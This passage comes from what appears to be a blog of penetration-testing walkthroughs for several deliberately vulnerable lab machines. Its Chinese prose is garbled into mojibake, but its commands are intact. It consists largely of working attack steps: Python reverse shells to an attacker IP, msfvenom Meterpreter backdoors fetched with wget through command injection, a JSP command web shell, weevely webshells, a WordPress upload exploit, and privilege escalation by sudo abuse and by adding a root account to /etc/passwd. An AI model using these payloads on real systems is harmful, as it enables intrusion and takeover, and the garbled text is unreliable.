SimpleHTTPServer 9990 &amp; ç„¶åå°è¯•å‘½ä»¤æ³¨å…¥æ¥ä½¿ç”¨wgetä¸‹è½½æœ¬åœ°çš„æ–‡ä»¶è¿›è¡Œæµ‹è¯•ï¼Œä»¥æ­¤æ¥åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œå› ä¸ºå¼€å¯HTTPæœåŠ¡ä¹‹åï¼Œæœ¬åœ°æ–‡ä»¶è¢«ä¸‹è½½æ˜¯ä¼šå­˜åœ¨æç¤ºçš„ |wget http://192.168.31.10:9990/1 å¯ä»¥çœ‹åˆ°æ–‡ä»¶è¢«ä¸‹è½½ï¼Œè¯´æ˜å¯ä»¥è¿›è¡Œå‘½ä»¤æ³¨å…¥ è¯¥é¶æœºä¸Šæ²¡æœ‰ncï¼Œä¸è¿‡å¯ä»¥é€šè¿‡pythonæ¥åå¼¹shell nc -lvvp 9900 | python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.10',9900));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot; å³å¯è·å–shell æƒé™æå‡ ç”±äºæœªçŸ¥çš„åŸå› ï¼Œæœ¬äººæµ‹è¯•æ—¶åœ¨ncçš„shellä¸­è¾“å…¥å­—ç¬¦ä¼šè¿ç»­å‡ºç°ä¸¤æ¬¡ï¼Œç”¨èµ·æ¥æœ‰äº›ä¸æ–¹ä¾¿ï¼Œåªå¥½è½¬åˆ°MSF ç”ŸæˆMeterpreteråé—¨ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.py åœ¨MSFä¸­é…ç½®ç›¸å…³å‚æ•° 12345use exploit&#x2F;multi&#x2F;handlerset payload python&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9995run ä½¿ç”¨wgetä¼ é€’åé—¨å¹¶å¯ç”¨ 12wget http:&#x2F;&#x2F;192.168.31.10:9900&#x2F;shell.pypython shell.py åœ¨Meterpreterä¸­è·å–pty 12shellpython -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; è¿™æ—¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ˜¯ç”¨æˆ·scannerçš„èº«ä»½ åœ¨homeç›®å½•ä¸‹çœ‹åˆ°ä¸€ä¸ªCçš„æºä»£ç åŠå…¶ç¼–è¯‘çš„ç¨‹åº å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™æ®µä»£ç åœ¨ä½¿ç”¨freshclamæ‰«ææ–‡ä»¶ä¹‹å‰ï¼Œä¼šå°†è¯¥ç”¨æˆ·å˜ä¸ºrootï¼Œè€Œä¸”è¯¥ç¨‹åºä¹Ÿå…·æœ‰SUIDæƒé™ è€Œè¯¥ç¨‹åºéœ€è¦ç”¨æˆ·è¾“å…¥æ–‡ä»¶åï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå¯¹æ–‡ä»¶åè¿›è¡Œæ³¨å…¥ï¼Œä½¿å…¶æ‰«ææ–‡ä»¶ä¹‹åå†æ‰§è¡Œä¸€æ®µä»£ç ï¼Œé‚£ä¹ˆææƒå°±å˜å¾—ç®€å•äº† æ„é€ åå¼¹Shellè„šæœ¬ ncç›‘å¬ç›¸åº”ç«¯å£ nc -lvvp 9996 æ‰§è¡Œç¨‹åº ./update_cloudav '1| python test.py' /console åœ¨è®¿é—®è·¯å¾„/consoleæ—¶ä¼šè¦æ±‚ç”¨æˆ·è¾“å…¥pinç ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡ä¿®æ”¹HTTP ResponseåŒ…ä¸­çš„ä¿¡æ¯æ¥è¿›è¡Œç»•è¿‡ æœ¬ä»¥ä¸ºç»™å‡ºçš„python consoleå¯ä»¥ç”¨æ¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†å¥½åƒåªèƒ½ç”¨äºæ‰§è¡Œjsé‡Œçš„ä¸€äº›å‡½æ•° å‚è€ƒèµ„æ–™ WalkThrough hackNos_Player 2020/05/09 18:39:43 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.33 Webè·¯å¾„æ‰«æ dirb http://192.168.31.33/ -w æ¼æ´åˆ©ç”¨ dirbå‘ç°äº†jsä»£ç ï¼Œç²—ç•¥å®¡è®¡ä¹‹åå¹¶æ²¡æœ‰è·å–åˆ°æœ‰æ•ˆçš„ä¿¡æ¯ åœ¨Apacheé»˜è®¤é¡µé¢å‘ç°å¦‚ä¸‹æç¤º è·¯å¾„/g@web/å¯è®¿é—® è·¯å¾„/mini@web/ä¸å¯è®¿é—® /g@web/æ˜¯ä¸€ä¸ªwordpressç«™ç‚¹ï¼Œä½¿ç”¨wpscanè¿›è¡Œä¿¡æ¯æ”¶é›† ç”¨æˆ·æšä¸¾ wpscan --url http://192.168.31.33/g@web/ -e u è®¿é—®http://192.168.31.33/g@web/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 æ’ä»¶æšä¸¾ wpscan --url http://192.168.31.33/g@web/ -e ap æœç´¢æ’ä»¶ç›¸å…³ä¿¡æ¯ è¿™é‡Œä½¿ç”¨searchsploitæœç´¢è¯¥æ’ä»¶æ—¶ç¼ºå°‘äº†ä¸€ä¸ªRCEçš„EXPï¼Œéœ€è¦åœ¨ç½‘ä¸Šè¿›è¡Œæœç´¢ https://wpvulndb.com/vulnerabilities/8949 ä½¿ç”¨è¯¥EXPç›´æ¥è·å–shell 123456&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;192.168.31.33&#x2F;g@web&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wpsp_upload_attachment&quot;&gt; Choose a file ending with .phtml: &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;0&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;&lt;&#x2F;form&gt; weevely generate pass shell.phtml ä¸Šä¼ ååœ¨http://192.168.31.33/g@web/wp-content/uploads/æ‰¾åˆ°ä¸Šä¼ çš„åé—¨ï¼Œå†ä½¿ç”¨weevelyè¿æ¥å³å¯è·å–shell æƒé™æå‡ åˆ©ç”¨å½“å‰webshellè·å–ä¸€ä¸ªMSFçš„Shellï¼Œæ–¹ä¾¿ä¹‹åè¿›è¡Œè´¦æˆ·ä¹‹é—´çš„åˆ‡æ¢ æ„é€ åé—¨ç¨‹åº msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9905 -f raw &gt; pass.php MSFConsoleä¸­è¿›è¡Œç›¸åº”é…ç½® 12345use explot&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.33set LPORT 9905run è§¦å‘MSFåé—¨ curl http://192.168.31.33/g@web/wp-content/uploads/wpsp/pass.php è·å–shellä¹‹åå†è·å–pty 12shellpython -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; æ ¹æ®ä¹‹å‰æ‰¾åˆ°çš„JSONçš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨hackNos@9012!!æ¥æå‡æˆ‘ä»¬çš„æƒé™ æŸ¥çœ‹ç›®å½•/homeçš„æ–‡ä»¶å¤¹ å°è¯•ä¹‹åè½¬æ¢åˆ°ç”¨æˆ·securityçš„èº«ä»½ 12su securityhackNos@9012!! æŸ¥çœ‹sudoæƒé™ è¿™é‡Œå¯ä»¥ä½¿ç”¨findå‘½ä»¤æ¥è¿›è¡Œæ°´å¹³ææƒ 12echo &gt; &#x2F;tmp&#x2F;1sudo -u hackNos-boat find &#x2F;tmp&#x2F;1 -exec &#x2F;bin&#x2F;bash \\; æŸ¥çœ‹sudoæƒé™ ç„¶åå†ä½¿ç”¨rubyè¿›è¡Œææƒ sudo -u hunter /usr/bin/ruby -e 'exec &quot;/bin/bash&quot;' æŸ¥çœ‹sudoæƒé™ ä½¿ç”¨gccè¿›è¡Œææƒ sudo -u root gcc -wrapper /bin/bash,-s . å³å¯è·å–rootæƒé™ gcc -wrapper æœ€åçš„gccææƒä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä½¿ç”¨systemå‡½æ•°æ¥è¿›è¡Œæ‰§è¡Œå‘½ä»¤ä»è€Œè¿›è¡Œææƒï¼Œä½†æ˜¯éšåå‘ç°è¿™ä¸ªæ“ä½œéœ€è¦SUIDæƒé™ï¼Œæœ€åçœ‹WPæ‰å‘ç°æ˜¯ä½¿ç”¨wrapperå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤ å‚è€ƒèµ„æ–™ wrapper WalkThrough DMV_1 2020/05/14 15:07:33 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.36 Webè·¯å¾„æ‰«æ dirb http://192.168.31.36/ -w æ¼æ´åˆ©ç”¨ WebæœåŠ¡çš„ä¸»é¡µæ˜¯ä¸€ä¸ªYoutubeè§†é¢‘åœ¨çº¿è½¬æ¢å·¥å…·ï¼Œè§‚å¯Ÿå‘é€çš„è¯·æ±‚åŒ…ï¼Œpostæ•°æ®ä¸ºURL æœ¬åœ°å¼€å¯HTTPæœåŠ¡ï¼Œå¹¶å°è¯•ä¿®æ”¹URL çŒœæµ‹å¯èƒ½å­˜åœ¨å‘½ä»¤æ³¨å…¥ éªŒè¯å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ ä½¿ç”¨MSFVenomæ„é€ Meterpreteråé—¨ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.php åœ¨MSFConsoleä¸­é…ç½®ç›¸å…³å‚æ•° 12345use exploit&#x2F;multi&#x2F;handler set payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9995run é€šè¿‡å‘½ä»¤æ³¨å…¥æ¥ä½¿ç”¨wgetä¸‹è½½Meterpreteråé—¨ ;wget$&#123;IFS&#125;http://192.168.31.10:9900/shell.php; è§¦å‘åé—¨ curl http://192.168.31.36/shell.php &amp; æƒé™æå‡ 12shellpython -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; è¿™é‡Œéœ€è¦ä½¿ç”¨PSPYæ¥æ£€æµ‹åå°çš„rootè¿›ç¨‹ PSPY: https://github.com/DominicBreuker/pspy/releases è¿™é‡Œå¯ä»¥çœ‹åˆ°rootåœ¨è¿è¡Œ/var/www/html/tmp/clean.sh è€Œä¸”è¯¥shè„šæœ¬å¯å†™ é‚£ä¹ˆå¯ä»¥åˆ©ç”¨rootèº«ä»½æ‰§è¡Œå‘½ä»¤ ç»™findå‘½ä»¤æ·»åŠ SUIDæƒé™ echo 'chmod u+s /usr/bin/find' &gt;&gt; clean.sh findå‘½ä»¤å·²ç»è·å¾—SUIDæƒé™ ä½¿ç”¨findå‘½ä»¤è·å–rootæƒé™ è¿™é‡Œå¯ä»¥çœ‹åˆ°euid=0 æŸ¥çœ‹flag find -&gt; bash ä¹‹å‰ä½¿ç”¨findè¿›è¡ŒSUIDè¿›è¡Œææƒæ—¶ï¼Œæ‰§è¡Œidå¯ä»¥çœ‹åˆ°euid=0ï¼Œä½†æ˜¯è·å–bashæ—¶å´è¿˜æ˜¯åŸæ¥çš„æƒé™ï¼Œè¿™é‡Œä½¿ç”¨bash -påˆ™å¯ä»¥ä¿ç•™euid å‚è€ƒèµ„æ–™ WalkThrough Zion 2020/05/21 13:09:10 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.1.5 Webè·¯å¾„æ‰«æ dirb http://192.168.1.5/ -w æ¼æ´åˆ©ç”¨ è®¿é—®Webé¡µé¢ ç‚¹å‡»Truth å¯ä»¥çœ‹åˆ°HTTP Headerä¸­å­˜åœ¨ä¸€äº›Baseç¼–ç è¿‡çš„ä¿¡æ¯ ç‚¹å‡»Illusion ç›´æ¥Getè¯·æ±‚/zion/login.php å¯¹è¿™äº›ä¿¡æ¯è¿›è¡ŒBase64è§£ç  Truth è¿™é‡Œæç¤ºç¬¬äºŒæ®µç¼–ç ä¸­æ²¡æœ‰â€™+â€™, â€˜-â€™, â€˜/â€™, â€˜=â€™ æ‰€ä»¥æ˜¯Base62ç¼–ç  å¯¹ç¬¬äºŒæ®µç¼–ç è¿›è¡ŒBase62è§£ç  http://decode-base62.nichabi.com/ è¿™é‡Œæç¤ºç”¨æˆ·åå’Œå¯†ç ä¿¡æ¯å­˜åœ¨äºé€‰æ‹©é¡µé¢ Illusion ä¿¡æ¯æ— æ•ˆ Get Request ä¿¡æ¯æ— æ•ˆ ä½¿ç”¨cewlè¿›è¡Œå­—å…¸ç”Ÿæˆ cewl http://192.168.1.5/ &gt; dic1 è½¬æ¢ä¸ºå°å†™ cat dic1 | tr A-Z a-z &gt; dic2 ä½¿ç”¨Burpè¿›è¡Œè´¦æˆ·çˆ†ç ´ å¾—åˆ°è´¦æˆ·morpheus.thematrix:interpreted ç™»é™†ä¹‹åç‚¹å‡»ä¸Šæ–¹çš„Private Key æ³¨æ„txtæ–‡æœ¬çš„æ–‡ä»¶åä¸º rsa_priv_key_for_w.rabbit.txt è¿™é‡Œä¿å­˜æœ¬åœ°ä¹‹åå†åŠ ä¸ŠPri_Keyæ–‡ä»¶çš„å¤´éƒ¨ä¸å°¾éƒ¨ SSHç™»å…¥ç›®æ ‡æœåŠ¡å™¨ ssh -i pri.key w.rabbit@192.168.1.5 æƒé™æå‡ æŸ¥çœ‹æ–‡ä»¶warning.txt æŸ¥çœ‹mail æŸ¥çœ‹suduæƒé™ ä½¿ç”¨sudoæƒé™æ¥è¿›è¡Œå¤åˆ¶flagæ–‡ä»¶ è¿™é‡Œå¯ä»¥çœ‹åˆ°flagæ–‡ä»¶çš„æƒé™ä¸º600 éœ€è¦åœ¨cpæ–‡ä»¶çš„åŒæ—¶æ›´æ”¹æƒé™ï¼Œè¿™é‡Œä½¿ç”¨å‚æ•°--noreserve mode, ownership æŸ¥çœ‹flag HTTPä¿¡æ¯ æ ¹æ®Postçš„å†…å®¹ä¸åŒï¼Œåœ¨HTTP Responseçš„Headerä¸­ç»™å‡ºä¸åŒçš„ä¿¡æ¯ï¼Œåœ¨å®ç°ä¸Šå¹¶ä¸æ˜¯éš¾äº‹ï¼Œæ€ç»´ä¸Šä¹Ÿèƒ½å¾ˆå¿«æ¥å—è¿™ä¸€æœºåˆ¶ï¼Œä½†æ˜¯ç”±äºä¹‹å‰æ²¡æœ‰ç¢°åˆ°è¿‡è¿™ç§æƒ…å†µï¼Œå¯¼è‡´åœ¨è¿™ä¸€æ­¥ä¸Šå¡äº†å¾ˆä¹…ã€‚æ‰€ä»¥åœ¨æµè§ˆç½‘é¡µæ—¶æœ€å¥½è¿˜æ˜¯ä½¿ç”¨BurpSuiteï¼Œä»¥ä¾¿æ›´åŠ ç›´è§‚åœ°çœ‹åˆ°å…¨éƒ¨çš„ä¿¡æ¯ å‚è€ƒèµ„æ–™ WalkThrough Broken-2020 2020/05/27 09:52:58 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.116 Webè·¯å¾„æ‰«æ dirb http://192.168.31.116/ -w æ¼æ´åˆ©ç”¨ è®¿é—®http://192.168.31.116/ï¼Œæ— æœ‰æ•ˆä¿¡æ¯ è®¿é—®http://192.168.31.116/cms/ï¼Œå¦‚å›¾ æ ¹æ®æŒ‡ç¤ºç‚¹å‡»æŒ‰é’® å†æ¬¡è®¿é—®http://192.168.31.116/ï¼Œå¦‚å›¾ é¡µé¢å‘ç”Ÿå˜åŒ– å†æ¬¡è®¿é—®http://192.168.31.116/cms/ï¼Œå¦‚å›¾ è·å–ç¬¬ä¸€ä¸ªflag å°è¯•å†æ¬¡æ‰«æWebç›®å½• è®¿é—®æ–°å‘ç°çš„ç›®å½•/cms/cc å°è¯•åœ¨ç«¯å£è¾“å…¥å¤„è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œå¤±è´¥ å¼€å¯æœ¬åœ°HTTPæœåŠ¡ï¼Œå†è¾“å…¥æœ¬åœ°IPä»¥åŠç›¸åº”ç«¯å£ å¯ä»¥çœ‹åˆ°è¯¥é¡µé¢åœ¨è¯·æ±‚æœ¬åœ°èµ„æº1c66b2e0cff58bal7b3f9a1994eb8c55.sh æ„é€ ä¸€ä¸ªåå¼¹Shellçš„æ–‡ä»¶ï¼Œå¹¶ä¸”ç›‘å¬ç«¯å£ï¼Œå†åœ¨burpä¸­è§¦å‘è¯¥æ–‡ä»¶ ç›®æ ‡æœºå™¨ä¸Šä¸‹è½½äº†è¯¥æ–‡ä»¶å¹¶ä¸”æ‰§è¡Œäº†ï¼Œæ¥æ”¶åˆ°åå¼¹Shell æƒé™æå‡ æŸ¥çœ‹ç›®å½•/home/aliceä¸‹çš„æ–‡æœ¬æ–‡ä»¶ è¿™é‡Œæç¤ºrootåœ¨åå°è¿è¡Œæ¸…é™¤apacheæ—¥å¿—çš„è„šæœ¬ï¼Œå¾ˆå­˜åœ¨crontabææƒ ä¸‹è½½pspy64 crontabè¿è¡Œä»»åŠ¡å¦‚å›¾ï¼Œå¯ä»¥ä»/home/alice/script/log.pyå¤„å…¥æ‰‹ å¯ä»¥çœ‹åˆ°è¿™ä¸ªscriptç›®å½•æ‰€æœ‰äººå¯å†™ å³ä½¿æ–‡ä»¶log.pyä¸å¯å†™ï¼Œä½†æ˜¯å¯ä»¥å‡­å€Ÿç›®å½•çš„æƒé™å»ä¿®æ”¹æ–‡ä»¶å æœ¬åœ°æ„é€ Meterpreterçš„åé—¨ç¨‹åº msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9993 -f raw &gt; new.py MSFConsoleä¸­è¿›è¡Œç›¸åº”é…ç½® 12345use exploit&#x2F;multi&#x2F;handlerset payload python&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9993run ä¸‹è½½æœ¬åœ°çš„åé—¨ç¨‹åºï¼Œå¹¶ä¸”å¯¹æ–‡ä»¶åè¿›è¡Œæ“ä½œ æ¥æ”¶åˆ°åå¼¹shellï¼Œè¿›å…¥ç›®å½•/home/alice/backup/ æŸ¥çœ‹æ‰€æœ‰æ–‡æœ¬æ–‡ä»¶ è¿è¡Œpspy64ï¼Œå¯ä»¥çœ‹åˆ°rootæ­£åœ¨è¿è¡Œè„šæœ¬backup.py å°†webç›®å½•è¾“å…¥è‡³path.txt å¯ä»¥çœ‹åˆ°htmlæ–‡ä»¶å¤¹è¢«å¤‡ä»½åˆ°äº†è¯¥ç›®å½•ä¸‹ è€Œä¸”æƒé™å‡ä¸º777 å°è¯•æ‰“åŒ…ç›®å½•/root/ æŸ¥çœ‹æ–‡ä»¶å¤¹rootä¸‹çš„å†…å®¹ ç›®å½•æƒé™&amp;crontab çœ‹ç€log.pyçš„744æƒé™ä¹Ÿæ˜¯æœ‰å¿ƒæ— åŠ›ï¼Œå‚è€ƒåˆ«äººçš„WalkThroughä¹‹åæ‰å‘ç°æ˜¯ç›®å½•çš„æƒé™é—®é¢˜ã€‚ç›®å½•å¯å†™åˆ™å¯ä»¥ä»»æ„ä¿®æ”¹ç›®å½•ä¸‹çš„æ–‡ä»¶åï¼Œé…åˆcrontabåˆ™å¯ä»¥ææƒã€‚ å‚è€ƒèµ„æ–™ WalkThrough My_Web_Server_1 2020/06/03 19:12:46 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.203 Webè·¯å¾„æ‰«æ dirb http://192.168.31.203/ -w dirb http://192.168.31.203:2222/ -w dirb http://192.168.31.203:8080/ -w dirb http://192.168.31.203:8081/ -w æ¼æ´åˆ©ç”¨ å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªWebå…¥å£ï¼Œç«¯å£åˆ†åˆ«æ˜¯80,2222,8080,8081 2222ç«¯å£ä¸Šè¿è¡Œçš„æ˜¯nostromoæœåŠ¡ï¼Œä½¿ç”¨searchsploitæŸ¥çœ‹ç›¸å…³æ¼æ´ å­˜åœ¨RCEæ¼æ´ï¼Œåœ¨MSFä¸­è¿›è¡Œé…ç½® 12345use exploit&#x2F;multi&#x2F;http&#x2F;nostromo_code_execset RHOSTS 192.168.31.203set RPORT 2222set LHOST 192.168.31.10run å³å¯è·å¾—æƒé™ æƒé™æå‡ æŸ¥çœ‹tomcatçš„Webè´¦æˆ· cat /usr/local/tomcat/conf/tomcat-users.xml è®¿é—®http://192.168.31.203:8080/,ç‚¹å‡»Manager App ä½¿ç”¨è´¦æˆ·tomcat:@sprot0230spè¿›è¡Œç™»å…¥ å°†jspåé—¨å‹ç¼©ä¸ºzipå¹¶æ›´æ”¹åç¼€å 12zip war.zip echo.jspmv war.zip war.war ç™»å…¥tomcatçš„Webè´¦æˆ·ï¼Œä¸Šä¼ jspåé—¨ 123456789101112&lt;% if(&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a &#x3D; -1; byte[] b &#x3D; new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a&#x3D;in.read(b))!&#x3D;-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;&#x2F;pre&gt;&quot;); &#125;%&gt; åˆ©ç”¨åŸæœ‰çš„Shellæ„é€ pythonåå¼¹Shellè„šæœ¬ æ‰¾ä¸€ä¸ªå¯å†™ç›®å½•/var/nostromo/logs/ï¼Œå†™å…¥è„šæœ¬new.py 12345import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]); æœ¬åœ°å¯ç”¨ncç›‘å¬ç«¯å£ nc -lvvp 8081 è®¿é—®jspåé—¨ä»¥æ‰§è¡Œå‘½ä»¤ http://192.168.31.203:8080/war/echo.jsp?pwd=pass&amp;i=python /var/nostromo/logs/new.py æ¥æ”¶åˆ°åå¼¹çš„tomcatç”¨æˆ·Shell è¿™é‡Œçœ‹åˆ°æœ‰bashçš„è®°å½• ä½¿ç”¨è¿‡å‘½ä»¤sudo -l å¯ä»¥ä½¿ç”¨javaè¿›è¡Œsudoææƒ æœ¬åœ°æ„é€ javaæºç  12345678910111213141516171819202122232425import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class sudo &#123; public static void main(String[] args) &#123; ProcessBuilder processBuilder &#x3D; new ProcessBuilder(); processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;); try &#123; Process process &#x3D; processBuilder.start(); BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123; System.out.println(line); &#125; int exitCode &#x3D; process.waitFor(); System.out.println(&quot;\\nExited with error code : &quot; + exitCode); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; å³å†™å…¥è´¦æˆ·test:hackforfun æœ¬åœ°å¯ç”¨HTTPæœåŠ¡ python -m SimpleHTTPServer 9900 &amp; ç›®æ ‡æœåŠ¡å™¨ä¸Šä¸‹è½½æºç  wget http://192.168.31.10:9900/sudo.java ç¼–è¯‘å¹¶æ‰§è¡Œ 12javac sudo.javasudo -u root &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;adoptopenjdk-8-hotspot-amd64&#x2F;bin&#x2F;java sudo æˆåŠŸå†™å…¥è´¦æˆ·ä¿¡æ¯ è·å–pty python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' åˆ‡æ¢è´¦æˆ· 12su testhackforfun å‚è€ƒèµ„æ–™ WalkThrough Typo:1 2020/06/09 21:51:36 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.26 Webè·¯å¾„æ‰«æ dirb http://192.168.31.26/ -w dirb http://192.168.31.26:8000/ -w dirb http://192.168.31.26:8080/ -w dirb http://192.168.31.26:8081/ -w æ¼æ´åˆ©ç”¨ è®¿é—®http://192.168.31.26/typo3/ è®¿é—®http://192.168.31.26:8080/phpinfo.php è®¿é—®http://192.168.31.26:8081/phpmyadmin/ phpmyadminå­˜åœ¨å¼±å£ä»¤root:root ç™»å…¥åæŸ¥çœ‹æ•°æ®åº“ï¼Œtypo3å¯¹åº”80ç«¯å£çš„WebæœåŠ¡ å¯ä»¥æ›¿æ¢è¡¨ä¸­çš„Hashå€¼æ¥è·å–è´¦å·æƒé™ è®¿é—® https://argon2.online/ ç”ŸæˆHash $argon2id$v=19$m=65536,t=16,p=2$MTIzNDU2Nzg$zsu3+i7HptpLzboB2NgkoqXdFnY1sfu2muwr4LFIbGo æ›¿æ¢Hashå€¼ä¹‹åç™»å…¥Typo3åå°ï¼ŒCMSè®¾å®šä¸­ä¸å…è®¸ä¸Šä¼ phpæ–‡ä»¶ Module Menu -&gt; ADMIN TOOLS -&gt; Settings -&gt; Configure Installation-Wide Options -&gt; Backend[BE] -&gt; [BE][fileDenyPattern] æ¸…é™¤å†…å®¹å³å¯è§£é™¤å¯¹äºæ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶ ä½¿ç”¨weevelyç”ŸæˆWebShell weevely generate pass wee.php ä¸Šä¼ WebShell è®¿é—®Shell è¿æ¥Shell weevely http://192.168.31.26/fileadmin/wee.php pass æƒé™æå‡ ä½¿ç”¨pythonåå¼¹Shell 1python3 -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; è·å–pty æŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„æ–‡ä»¶ è¿™é‡Œçš„/usr/local/binè·¯åŠ²ä¸‹çš„æ–‡ä»¶æ˜æ˜¾æ˜¯ä¸å¯¹åŠ²çš„ apache2-restartä¸ºELFæ–‡ä»¶ ä½¿ç”¨stringså‘½ä»¤æŸ¥çœ‹æ–‡ä»¶å­—ç¬¦ ä½¿ç”¨çš„æ˜¯serviceå‘½ä»¤ è¿›è¡ŒPATHææƒ å‚è€ƒèµ„æ–™ WalkThrough DerpNStink 2020/06/22 14:53:48 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B2 VMware ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.61 Webè·¯å¾„æ‰«æ dirb http://192.168.31.61/ -w æ¼æ´åˆ©ç”¨ ç›®å½•/weblog/è®¾ç½®äº†302è·³è½¬å¹¶æŒ‡å‘äº†ä¸€ä¸ªåŸŸåï¼Œéœ€è¦ä¿®æ”¹hostsæ–‡ä»¶ ä½¿ç”¨Wordpressæ¡†æ¶ï¼Œå¯ä»¥ä½¿ç”¨wpscanè¿›è¡Œæ‰«æ wpscan --url http://derpnstink.local/weblog/ -e u wpscan --url http://derpnstink.local/weblog/ -e ap æŸ¥æ‰¾æ’ä»¶ç›¸å…³ä¿¡æ¯ searchsploit slideshow gallery 1.4.6 æ‹·è´æ–‡ä»¶ searchsploit -m 34681 éœ€è¦Wordpressçš„è´¦æˆ· å°è¯•å¼±å£ä»¤å¾—åˆ°è´¦æˆ·admin:admin ç”Ÿæˆphpåé—¨ weevely generate pass wee.php ä½¿ç”¨è„šæœ¬ä¸Šä¼ åé—¨ python 34681.txt -t http://derpnstink.local/weblog/ -u admin -p admin -f wee.php è¿æ¥åé—¨ weevely http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/wee.php pass pythonåå¼¹Shell 123nc -lvnp 8081-----python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; æƒé™æå‡ è·å–pty 